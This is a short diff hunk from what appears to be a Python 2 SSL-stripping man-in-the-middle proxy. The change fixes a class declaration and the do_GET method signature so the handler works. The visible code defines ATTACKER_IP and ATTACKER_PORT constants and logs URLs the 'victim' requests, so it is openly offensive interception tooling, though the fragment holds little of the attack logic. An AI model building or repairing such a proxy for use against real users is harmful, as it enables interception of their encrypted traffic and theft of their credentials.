@@ -159,11 +159,11 @@ from StringIO import StringIO
 ATTACKER_IP = "0.0.0.0"
 ATTACKER_PORT = 8080
 
-def SSLStripProxy(BaseHTTPRequestHandler):
+class SSLStripProxy(BaseHTTPRequestHandler):
 	def __init__(self, request, client_address, server):
 		BaseHTTPRequestHandler.__init__(self, request, client_address, server)
 	
-	def do_GET(self, request, client_address, server):
+	def do_GET(self):
 		host = self.headers.getheader('Host', '')
 		url = "https://{}{}".format(host, self.path)
 		print "[+] Victim requested:", url
